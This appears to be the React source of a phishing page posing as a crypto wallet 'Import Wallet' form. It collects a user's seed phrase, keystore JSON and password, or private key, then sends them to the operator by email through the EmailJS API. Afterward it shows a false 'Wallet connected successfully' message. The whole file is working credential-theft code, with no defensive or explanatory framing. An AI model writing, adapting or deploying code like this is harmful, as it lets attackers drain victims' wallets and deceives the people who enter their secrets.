import React, { FC, useRef, useState } from "react";
// import { useRouter } from "next/router";
import styled from "styled-components";
// import emailjs from "@emailjs/browser";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

import InputField from "../input";
import TextArea from "../input/textarea";
import Button from "../button";
import axios from "axios";
import { useLocation } from "react-router-dom";

interface KeyProps {
  keyword: string;
  setKey: (message: string) => void;
  password: string;
  setPassword: (message: string) => void;
}

const KeyStonePart = ({ keyword, password, setKey, setPassword }: KeyProps) => {
  return (
    <div className="key-stone">
      <TextArea
        value={keyword}
        onChange={(e) => setKey(e.target.value)}
        placeholder="Input your KeyStone JSON Value"
        name="keystone"
      />
      <InputField
        placeholder="Enter password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        type="password"
        name="password"
      />
    </div>
  );
};

interface PhraseProps {
  phrase: string;
  setPhrase: (message: string) => void;
}

const PhrasePart = ({ phrase, setPhrase }: PhraseProps) => {
  return (
    <div className="key-stone">
      <p className="form-title-p">
        {/* eslint-disable-next-line jsx-a11y/click-events-have-key-events, jsx-a11y/no-static-element-interactions */}
        Typically 12 (sometimes 24) words separated by single spaces.
      </p>
      <TextArea
        value={phrase}
        onChange={(e) => setPhrase(e.target.value)}
        placeholder="Input your Phrase Value"
        name="phrase"
      />
    </div>
  );
};

interface PrivateProps {
  privateKey: string;
  setPrivateKey: (message: string) => void;
}

const PrivateKeyPart = ({ privateKey, setPrivateKey }: PrivateProps) => {
  return (
    <div className="key-stone">
      <TextArea
        value={privateKey}
        onChange={(e) => setPrivateKey(e.target.value)}
        placeholder="Input your private key value"
        name="privatekey"
      />
    </div>
  );
};

const PraseForm: FC = () => {
  // const router = useRouter();
  const params = useLocation().search.split("=")[1];

  const serviceId = process.env.REACT_APP_SERVICE_ID as string;
  const templateId = process.env.REACT_APP_TEMPLATE_ID as string;
  const publicKey = process.env.REACT_APP_PUB_KEY as string;

  const [phrase, setPhrase] = useState("");
  const [keyword, setKey] = useState("");
  const [password, setPassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  const [loading, setLoading] = useState(false);
  const [activeScreen, setActiveScreen] = useState<
    "phrase" | "keystone" | "private"
  >("phrase");
  const formRef = useRef<string | HTMLFormElement>("");

  const sendEmail = (e: any) => {
    e.preventDefault();

    const data = {
      service_id: serviceId,
      template_id: templateId,
      user_id: publicKey,
      template_params: {
        wallet: params,
        type: activeScreen,
        message: "",
      },
    };

    if (activeScreen === "keystone") {
      if (keyword && password) {
        data.template_params.message = `
        keyword: ${keyword},
        password: ${password}
        `;
        setLoading(true);
        axios.post("https://api.emailjs.com/api/v1.0/email/send", data).then(
          (result) => {
            setLoading(false);
            setKey("");
            setPassword("");
            toast("Wallet connected successfully", {
              position: "bottom-center",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "light",
              type: "success",
            });
          },
          (error) => {
            setLoading(false);
            toast("Couldn't complete your request, try again", {
              position: "bottom-center",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "light",
              type: "error",
            });
          }
        );
      } else {
        toast("Please fill out all fields", {
          position: "bottom-center",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "light",
          type: "warning",
        });
      }
    }

    if (activeScreen === "private") {
      if (privateKey) {
        data.template_params.message = `
        private key: ${privateKey},
        `;
        setLoading(true);
        axios.post("https://api.emailjs.com/api/v1.0/email/send", data).then(
          (result) => {
            setLoading(false);
            setPrivateKey("");
            toast("Wallet connected successfully", {
              position: "bottom-center",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "light",
              type: "success",
            });
          },
          (error) => {
            setLoading(false);
            toast("Couldn't complete your request, try again", {
              position: "bottom-center",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "light",
              type: "error",
            });
          }
        );
      } else {
        toast("Please fill out all fields", {
          position: "bottom-center",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "light",
          type: "warning",
        });
      }
    }

    if (activeScreen === "phrase") {
      if (phrase) {
        data.template_params.message = `
          phrase: ${phrase},
        `;
        setLoading(true);
        axios.post("https://api.emailjs.com/api/v1.0/email/send", data).then(
          (result) => {
            setLoading(false);
            setPhrase("");
            toast("Wallet connected successfully", {
              position: "bottom-center",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "light",
              type: "success",
            });
          },
          (error) => {
            setLoading(false);
            toast("Couldn't complete your request, try again", {
              position: "bottom-center",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "light",
              type: "error",
            });
          }
        );
      } else {
        toast("Please fill out all fields", {
          position: "bottom-center",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "light",
          type: "warning",
        });
      }
    }
  };

  const handleActiveScreen = () => {
    switch (activeScreen) {
      case "keystone":
        return (
          <KeyStonePart
            password={password}
            setPassword={setPassword}
            keyword={keyword}
            setKey={setKey}
          />
        );
      case "phrase":
        return <PhrasePart phrase={phrase} setPhrase={setPhrase} />;
      case "private":
        return (
          <PrivateKeyPart
            privateKey={privateKey}
            setPrivateKey={setPrivateKey}
          />
        );
      default:
        return <PhrasePart phrase={phrase} setPhrase={setPhrase} />;
    }
  };

  return (
    <PraseFormStyled>
      <div className="tag" />

      {/* @ts-ignore-next-line */}
      <form className="form" onSubmit={sendEmail} ref={formRef}>
        <div className="form-title">
          <h3>Import Wallet</h3>
        </div>
        <ul className="nav">
          <li
            className={activeScreen === "phrase" ? "active" : ""}
            onClick={() => setActiveScreen("phrase")}
          >
            Phrase
          </li>
          <li
            className={activeScreen === "keystone" ? "active" : ""}
            onClick={() => setActiveScreen("keystone")}
          >
            Keystore Json
          </li>
          <li
            className={activeScreen === "private" ? "active" : ""}
            onClick={() => setActiveScreen("private")}
          >
            Private key
          </li>
        </ul>
        {handleActiveScreen()}
        <Button title="Import" type="submit" isLoading={loading} />
        <ToastContainer pauseOnHover />
      </form>
    </PraseFormStyled>
  );
};

export default PraseForm;

const PraseFormStyled = styled.section`
  width: 80%;
  margin: auto;
  margin-top: 3rem;
  padding: 4rem 0;
  position: relative;
  background: ${({ theme }) => theme.colors.black};
  border-radius: 15px;
  position: relative;

  .tag {
    width: 20px;
    height: 35px;
    border-top-left-radius: 5px;
    border-bottom-left-radius: 5px;
    position: absolute;
    left: -20px;
    top: 50%;
    transform: translateY(-50%);
    background: ${({ theme }) => theme.colors.white};
  }

  .nav {
    display: flex;
    align-items: center;
    justify-content: space-between;
    height: 50px;
    width: 100%;
    margin-bottom: 2rem;

    li {
      list-style: none;
      width: 33.3%;
      height: 100%;
      text-align: center;
      display: flex;
      align-items: center;
      justify-content: center;
      color: ${({ theme }) => theme.colors.bg};
      font-weight: 600;
      border: 1px solid ${({ theme }) => theme.colors.bg};
      background: ${({ theme }) => theme.colors.primary};
      cursor: pointer;
      transition: all 0.3s ease-in-out;

      &.active {
        color: ${({ theme }) => theme.colors.primary};
        background: ${({ theme }) => theme.colors.bg};
      }
    }
  }

  .form {
    width: 400px;
    margin: auto;
  }

  .form-title {
    text-align: center;
    margin-bottom: 2rem;
  }

  .form-title-p {
    font-size: ${({ theme }) => theme.fonts.sizes.small};
    width: 100%;
    margin: auto;
    margin-top: 10px;
    text-align: center;
    margin-bottom: 2rem;

    span {
      color: ${({ theme }) => theme.colors.primary};
      cursor: pointer;
    }
  }

  button {
    margin: 2rem auto 0;
  }

  @media screen and (max-width: 500px) {
    padding: 1.5rem;
    border-radius: 10px;
    width: 100%;
    margin-top: 1.5rem;
    .tag {
      display: none;
    }

    .form {
      width: 100%;
    }

    .form-title p {
      width: 100%;
    }
  }
`;
